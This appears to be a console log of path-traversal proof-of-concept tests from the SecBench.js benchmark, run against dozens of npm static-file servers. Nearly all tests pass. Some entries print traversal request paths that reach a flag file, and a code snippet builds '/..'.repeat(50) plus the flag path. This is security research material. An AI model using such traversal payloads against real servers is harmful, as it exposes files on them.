+Tests:       1 failed, 1 total
+Snapshots:   0 total
+Time:        0.267 s
+Ran all test suites matching path-traversal/express-blinker_0.0.6/express-blinker.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+TEST FAILED
+path-traversal/zhanglina_1.0.0/zhanglina.test.js
+8888/tcp:           
+ PASS  ./zhanglina.test.js
+  ✓ Path Traversal in zhanglina (2055 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.37 s
+Ran all test suites matching path-traversal/zhanglina_1.0.0/zhanglina.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/zhanglina_1.0.0/zhanglina.test.js'], returncode=0)
+TEST PASSED
+path-traversal/run-this-place_1.0.2/run-this-place.test.js
+8080/tcp:           
+ PASS  ./run-this-place.test.js
+  ✓ Path Traversal in run-this-place (2100 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.405 s
+Ran all test suites matching path-traversal/run-this-place_1.0.2/run-this-place.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/run-this-place_1.0.2/run-this-place.test.js'], returncode=0)
+TEST PASSED
+path-traversal/serverlyj333_1.1.0/serverlyj333.test.js
+ PASS  ./serverlyj333.test.js
+  ✓ Path Traversal in serverlyj333 (2115 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.371 s
+Ran all test suites matching path-traversal/serverlyj333_1.1.0/serverlyj333.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/serverlyj333_1.1.0/serverlyj333.test.js'], returncode=0)
+TEST PASSED
+path-traversal/my-sn_1.0.1/my-sn.test.js
+9000/tcp:           
+ PASS  ./my-sn.test.js
+  ✓ Path Traversal in my-sn (2049 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.362 s
+Ran all test suites matching path-traversal/my-sn_1.0.1/my-sn.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/my-sn_1.0.1/my-sn.test.js'], returncode=0)
+TEST PASSED
+path-traversal/wenluhong111_1.0.0/wenluhong111.test.js
+ PASS  ./wenluhong111.test.js
+  ✓ Path Traversal in wenluhong111 (2117 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.402 s
+Ran all test suites matching path-traversal/wenluhong111_1.0.0/wenluhong111.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/wenluhong111_1.0.0/wenluhong111.test.js'], returncode=0)
+TEST PASSED
+path-traversal/wangguojing123_1.3.0/wangguojing123.test.js
+8888/tcp:           
+ PASS  ./wangguojing123.test.js
+  ✓ Path Traversal in wangguojing123 (2047 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.377 s
+Ran all test suites matching path-traversal/wangguojing123_1.3.0/wangguojing123.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/wangguojing123_1.3.0/wangguojing123.test.js'], returncode=0)
+TEST PASSED
+path-traversal/@vivaxy-here_3.1.0/vivaxy_here.test.js
+3000/tcp:           
+ PASS  ./vivaxy_here.test.js
+  ✓ Path Traversal in @vivaxy/here (2033 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.342 s
+Ran all test suites matching path-traversal/@vivaxy-here_3.1.0/vivaxy_here.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/@vivaxy-here_3.1.0/vivaxy_here.test.js'], returncode=0)
+TEST PASSED
+path-traversal/yzt_1.4.0/yzt.test.js
+9987/tcp:           
+ PASS  ./yzt.test.js
+  ✓ Path Traversal in yzt (2038 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.359 s
+Ran all test suites matching path-traversal/yzt_1.4.0/yzt.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/yzt_1.4.0/yzt.test.js'], returncode=0)
+TEST PASSED
+path-traversal/wintiwebdev_1.0.0/wintiwebdev.test.js
+8000/tcp:           
+ PASS  ./wintiwebdev.test.js
+  ✓ Path Traversal in wintiwebdev (2053 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.293 s, estimated 3 s
+Ran all test suites matching path-traversal/wintiwebdev_1.0.0/wintiwebdev.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/wintiwebdev_1.0.0/wintiwebdev.test.js'], returncode=0)
+TEST PASSED
+path-traversal/easy-node-server_1.2.1/easy-node-server.test.js
+  console.log
+    服务启动成功，可以用浏览器访问：http://localhost:8895 确认
+
+      at Server.<anonymous> (node_modules/easy-node-server/index.js:83:17)
+
+  console.log
+    ---------------request from-----------------
+
+      at Server.<anonymous> (node_modules/easy-node-server/index.js:32:17)
+
+  console.log
+    /../../flag.html
+
+      at Server.<anonymous> (node_modules/easy-node-server/index.js:33:17)
+
+ PASS  ./easy-node-server.test.js
+  ✓ Path Traversal in easy-node-server (52 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.283 s
+Ran all test suites matching path-traversal/easy-node-server_1.2.1/easy-node-server.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/easy-node-server_1.2.1/easy-node-server.test.js'], returncode=0)
+TEST PASSED
+path-traversal/susu-sum_1.0.0/susu-sum.test.js
+8888/tcp:           
+ PASS  ./susu-sum.test.js
+  ✓ Path Traversal in susu-sum (2055 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.372 s
+Ran all test suites matching path-traversal/susu-sum_1.0.0/susu-sum.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/susu-sum_1.0.0/susu-sum.test.js'], returncode=0)
+TEST PASSED
+path-traversal/serveryztyzt_1.4.0/serveryztyzt.test.js
+9987/tcp:           
+ PASS  ./serveryztyzt.test.js
+  ✓ Path Traversal in serveryztyzt (2057 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.373 s
+Ran all test suites matching path-traversal/serveryztyzt_1.4.0/serveryztyzt.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/serveryztyzt_1.4.0/serveryztyzt.test.js'], returncode=0)
+TEST PASSED
+path-traversal/zhaolei1111_1.1.0/zhaolei1111.test.js
+8035/tcp:           
+ PASS  ./zhaolei1111.test.js
+  ✓ Path Traversal in zhaolei1111 (2051 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.357 s
+Ran all test suites matching path-traversal/zhaolei1111_1.1.0/zhaolei1111.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/zhaolei1111_1.1.0/zhaolei1111.test.js'], returncode=0)
+TEST PASSED
+path-traversal/ljjnodeserve_1.0.0/ljjnodeserve.test.js
+ PASS  ./ljjnodeserve.test.js
+  ✓ Path Traversal in ljjnodeserve (2143 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.381 s
+Ran all test suites matching path-traversal/ljjnodeserve_1.0.0/ljjnodeserve.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/ljjnodeserve_1.0.0/ljjnodeserve.test.js'], returncode=0)
+TEST PASSED
+path-traversal/node-staticserver_1.0.3/node-staticserver.test.js
+ PASS  ./node-staticserver.test.js
+  ✓ Path Traversal in node-staticserver (49 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.29 s
+Ran all test suites matching path-traversal/node-staticserver_1.0.3/node-staticserver.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/node-staticserver_1.0.3/node-staticserver.test.js'], returncode=0)
+TEST PASSED
+path-traversal/stattic_0.2.3/stattic.test.js
+  console.log
+
+
+      at Server.<anonymous> (node_modules/stattic/index.js:154:15)
+
+  console.log
+    Static server listening on: http://localhost:8977
+
+      at Server.<anonymous> (node_modules/stattic/index.js:155:15)
+
+  console.log
+    Reading files from: /home/bombe/UniSaarland/Websec-Seminar/SecBench.js/path-traversal/stattic_0.2.3
+
+      at Server.<anonymous> (node_modules/stattic/index.js:156:15)
+
+  console.log
+
+
+      at Server.<anonymous> (node_modules/stattic/index.js:157:15)
+
+  console.log
+    200  /../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../home/bombe/UniSaarland/Websec-Seminar/SecBench.js/path-traversal/flag.html  8 ms
+
+      at ServerResponse.<anonymous> (node_modules/stattic/index.js:99:15)
+
+ PASS  ./stattic.test.js
+  ✓ Path Traversal in stattic (66 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.299 s
+Ran all test suites matching path-traversal/stattic_0.2.3/stattic.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/stattic_0.2.3/stattic.test.js'], returncode=0)
+TEST PASSED
+path-traversal/lzl123_1.1.0/lzl123.test.js
+8888/tcp:           
+ PASS  ./lzl123.test.js
+  ✓ Path Traversal in lzl123 (2043 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.346 s
+Ran all test suites matching path-traversal/lzl123_1.1.0/lzl123.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/lzl123_1.1.0/lzl123.test.js'], returncode=0)
+TEST PASSED
+path-traversal/node-static-webserver_0.0.1/node-static-webserver.test.js
+ PASS  ./node-static-webserver.test.js
+  ✓ Path Traversal in node-static-webserver (38 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.276 s
+Ran all test suites matching path-traversal/node-static-webserver_0.0.1/node-static-webserver.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/node-static-webserver_0.0.1/node-static-webserver.test.js'], returncode=0)
+TEST PASSED
+path-traversal/gaoxiaotingtingting_1.1.0/gaoxiaotingtingting.test.js
+8888/tcp:           
+ PASS  ./gaoxiaotingtingting.test.js
+  ✓ Path Traversal in gaoxiaotingtingting (2045 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.355 s
+Ran all test suites matching path-traversal/gaoxiaotingtingting_1.1.0/gaoxiaotingtingting.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/gaoxiaotingtingting_1.1.0/gaoxiaotingtingting.test.js'], returncode=0)
+TEST PASSED
+path-traversal/11xiaoli_1.1.0/11xiaoli.test.js
+8888/tcp:           
+ PASS  ./11xiaoli.test.js
+  ✓ Path Traversal in 11xiaoli (2043 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.266 s, estimated 3 s
+Ran all test suites matching path-traversal/11xiaoli_1.1.0/11xiaoli.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/11xiaoli_1.1.0/11xiaoli.test.js'], returncode=0)
+TEST PASSED
+path-traversal/getstats_1.0.6/getstats.test.js
+9001/tcp:           
+ PASS  ./getstats.test.js
+  ✓ Path Traversal in getstats (2072 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.388 s
+Ran all test suites matching path-traversal/getstats_1.0.6/getstats.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/getstats_1.0.6/getstats.test.js'], returncode=0)
+TEST PASSED
+path-traversal/shit-server_1.0.0/shit-server.test.js
+8080/tcp:           
+ PASS  ./shit-server.test.js
+  ✓ Path Traversal in shit-server (2045 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.357 s
+Ran all test suites matching path-traversal/shit-server_1.0.0/shit-server.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/shit-server_1.0.0/shit-server.test.js'], returncode=0)
+TEST PASSED
+path-traversal/ussasasa_1.0.0/ussasasa.test.js
+8888/tcp:           
+ PASS  ./ussasasa.test.js
+  ✓ Path Traversal in ussasasa (2047 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.372 s
+Ran all test suites matching path-traversal/ussasasa_1.0.0/ussasasa.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/ussasasa_1.0.0/ussasasa.test.js'], returncode=0)
+TEST PASSED
+path-traversal/yypsulie11_1.0.0/yypsulie11.test.js
+8888/tcp:           
+ PASS  ./yypsulie11.test.js
+  ✓ Path Traversal in yypsulie11 (2050 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.436 s
+Ran all test suites matching path-traversal/yypsulie11_1.0.0/yypsulie11.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/yypsulie11_1.0.0/yypsulie11.test.js'], returncode=0)
+TEST PASSED
+path-traversal/xxf11_1.0.1/xxf11.test.js
+8890/tcp:           
+ PASS  ./xxf11.test.js
+  ✓ Path Traversal in xxf11 (2045 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.289 s, estimated 3 s
+Ran all test suites matching path-traversal/xxf11_1.0.1/xxf11.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/xxf11_1.0.1/xxf11.test.js'], returncode=0)
+TEST PASSED
+path-traversal/sgqserve_1.0.0/sgqserve.test.js
+8888/tcp:           
+ PASS  ./sgqserve.test.js
+  ✓ Path Traversal in sgqserve (2050 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.368 s
+Ran all test suites matching path-traversal/sgqserve_1.0.0/sgqserve.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/sgqserve_1.0.0/sgqserve.test.js'], returncode=0)
+TEST PASSED
+path-traversal/22lixian_1.0.0/22lixian.test.js
+8888/tcp:           
+ PASS  ./22lixian.test.js
+  ✓ Path Traversal in 22lixian (2058 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.392 s
+Ran all test suites matching path-traversal/22lixian_1.0.0/22lixian.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/22lixian_1.0.0/22lixian.test.js'], returncode=0)
+TEST PASSED
+path-traversal/wuzhuangserver_1.8.0/wuzhuangserver.test.js
+8888/tcp:           
+ PASS  ./wuzhuangserver.test.js
+  ✓ Path Traversal in wuzhuangserver (2051 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.383 s
+Ran all test suites matching path-traversal/wuzhuangserver_1.8.0/wuzhuangserver.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/wuzhuangserver_1.8.0/wuzhuangserver.test.js'], returncode=0)
+TEST PASSED
+path-traversal/rollup-plugin-dev-server_0.4.3/rollup-plugin-dev-server.test.js
+ PASS  ./rollup-plugin-dev-server.test.js
+  ✓ Path Traversal in rollup-plugin-dev-server (43 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.281 s
+Ran all test suites matching path-traversal/rollup-plugin-dev-server_0.4.3/rollup-plugin-dev-server.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/rollup-plugin-dev-server_0.4.3/rollup-plugin-dev-server.test.js'], returncode=0)
+TEST PASSED
+path-traversal/static-html-server_0.1.2/static-html-server.test.js
+7788/tcp:           
+ PASS  ./static-html-server.test.js
+  ✓ Path Traversal in static-html-server (2060 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.399 s
+Ran all test suites matching path-traversal/static-html-server_0.1.2/static-html-server.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/static-html-server_0.1.2/static-html-server.test.js'], returncode=0)
+TEST PASSED
+path-traversal/gamebutler_1.0.4/gamebutler.test.js
+8080/tcp:           
+ PASS  ./gamebutler.test.js
+  ✓ Path Traversal in gamebutler (2055 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.407 s
+Ran all test suites matching path-traversal/gamebutler_1.0.4/gamebutler.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/gamebutler_1.0.4/gamebutler.test.js'], returncode=0)
+TEST PASSED
+path-traversal/servey_2.2.0/servey.test.js
+8080/tcp:           
+ PASS  ./servey.test.js
+  ✓ Path Traversal in servey (2052 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.392 s
+Ran all test suites matching path-traversal/servey_2.2.0/servey.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/servey_2.2.0/servey.test.js'], returncode=0)
+TEST PASSED
+path-traversal/wuzhuang_1.0.0/wuzhuang.test.js
+8888/tcp:           
+ PASS  ./wuzhuang.test.js
+  ✓ Path Traversal in wuzhuang (2066 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.396 s
+Ran all test suites matching path-traversal/wuzhuang_1.0.0/wuzhuang.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/wuzhuang_1.0.0/wuzhuang.test.js'], returncode=0)
+TEST PASSED
+path-traversal/caolilinode_1.0.0/caolilinode.test.js
+8888/tcp:           
+ PASS  ./caolilinode.test.js
+  ✓ Path Traversal in caolilinode (2058 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.407 s
+Ran all test suites matching path-traversal/caolilinode_1.0.0/caolilinode.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/caolilinode_1.0.0/caolilinode.test.js'], returncode=0)
+TEST PASSED
+path-traversal/uekw1511server_1.0.1/uekw1511server.test.js
+8888/tcp:           
+ PASS  ./uekw1511server.test.js
+  ✓ Path Traversal in uekw1511server (2069 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.344 s, estimated 3 s
+Ran all test suites matching path-traversal/uekw1511server_1.0.1/uekw1511server.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/uekw1511server_1.0.1/uekw1511server.test.js'], returncode=0)
+TEST PASSED
+path-traversal/rollup-plugin-serve_0.4.2/rollup-plugin-serve.test.js
+ PASS  ./rollup-plugin-serve.test.js
+  ✓ Path Traversal in rollup-plugin-serve (56 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.341 s
+Ran all test suites matching path-traversal/rollup-plugin-serve_0.4.2/rollup-plugin-serve.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/rollup-plugin-serve_0.4.2/rollup-plugin-serve.test.js'], returncode=0)
+TEST PASSED
+path-traversal/shenliru3_1.3.0/shenliru3.test.js
+8888/tcp:           
+ PASS  ./shenliru3.test.js
+  ✓ Path Traversal in shenliru3 (2070 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.436 s
+Ran all test suites matching path-traversal/shenliru3_1.3.0/shenliru3.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/shenliru3_1.3.0/shenliru3.test.js'], returncode=0)
+TEST PASSED
+path-traversal/serve-here.js_1.1.0/serve-here_js.test.js
+8000/tcp:           
+ PASS  ./serve-here_js.test.js
+  ✓ Path Traversal in serve-here.js (2079 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.431 s
+Ran all test suites matching path-traversal/serve-here.js_1.1.0/serve-here_js.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/serve-here.js_1.1.0/serve-here_js.test.js'], returncode=0)
+TEST PASSED
+path-traversal/statichttpserver_0.9.7/statichttpserver.test.js
+9001/tcp:           
+ PASS  ./statichttpserver.test.js
+  ✓ Path Traversal in statichttpserver (2059 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.407 s
+Ran all test suites matching path-traversal/statichttpserver_0.9.7/statichttpserver.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/statichttpserver_0.9.7/statichttpserver.test.js'], returncode=0)
+TEST PASSED
+path-traversal/gfm-srv_1.1.2/gfm-srv.test.js
+8000/tcp:           
+ PASS  ./gfm-srv.test.js
+  ✓ Path Traversal in gfm-srv (2069 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.455 s
+Ran all test suites matching path-traversal/gfm-srv_1.1.2/gfm-srv.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/gfm-srv_1.1.2/gfm-srv.test.js'], returncode=0)
+TEST PASSED
+path-traversal/ex-http-frame_1.0.2/ex-http-frame.test.js
+8080/tcp:           
+ PASS  ./ex-http-frame.test.js
+  ✓ Path Traversal in ex-http-frame (2057 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.457 s
+Ran all test suites matching path-traversal/ex-http-frame_1.0.2/ex-http-frame.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/ex-http-frame_1.0.2/ex-http-frame.test.js'], returncode=0)
+TEST PASSED
+path-traversal/zjjserver_1.0.0/zjjserver.test.js
+4848/tcp:           
+ PASS  ./zjjserver.test.js
+  ✓ Path Traversal in zjjserver (2064 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.43 s
+Ran all test suites matching path-traversal/zjjserver_1.0.0/zjjserver.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/zjjserver_1.0.0/zjjserver.test.js'], returncode=0)
+TEST PASSED
+path-traversal/sabu_1.0.6/sabu.test.js
+8080/tcp:           
+ PASS  ./sabu.test.js
+  ✓ Path Traversal in sabu (2061 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.445 s
+Ran all test suites matching path-traversal/sabu_1.0.6/sabu.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/sabu_1.0.6/sabu.test.js'], returncode=0)
+TEST PASSED
+path-traversal/shenliru_1.2.0/shenliru.test.js
+8888/tcp:           
+ PASS  ./shenliru.test.js
+  ✓ Path Traversal in shenliru (2085 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.439 s
+Ran all test suites matching path-traversal/shenliru_1.2.0/shenliru.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/shenliru_1.2.0/shenliru.test.js'], returncode=0)
+TEST PASSED
+path-traversal/hangersteak_0.2.2/hangersteak.test.js
+ PASS  ./hangersteak.test.js
+  ✓ Path Traversal in hangersteak (52 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.305 s
+Ran all test suites matching path-traversal/hangersteak_0.2.2/hangersteak.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/hangersteak_0.2.2/hangersteak.test.js'], returncode=0)
+TEST PASSED
+path-traversal/lander_1.0.0/lander.test.js
+  console.log
+    server start at prot: 8988
+
+      at module.exports (node_modules/lander/index.js:15:11)
+
+ PASS  ./lander.test.js
+  ✓ Path Traversal in lander (74 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.334 s
+Ran all test suites matching path-traversal/lander_1.0.0/lander.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/lander_1.0.0/lander.test.js'], returncode=0)
+TEST PASSED
+path-traversal/srverqq_1.0.0/srverqq.test.js
+ FAIL  ./srverqq.test.js
+  ● Test suite failed to run
+
+    Cannot find module './build/Release/node_sleep.node' from '../node_modules/sleep/index.js'
+
+    Require stack:
+      /home/bombe/UniSaarland/Websec-Seminar/SecBench.js/path-traversal/node_modules/sleep/index.js
+      srverqq.test.js
+
+       6 | });
+       7 | const path = require("path");
+    >  8 | const { sleep } = require("sleep");
+         |                   ^
+       9 | const pathToFlag = path.resolve(__dirname, "../flag.html");
+      10 | function genstr(n) {
+      11 |   return "/..".repeat(50) + pathToFlag;
+
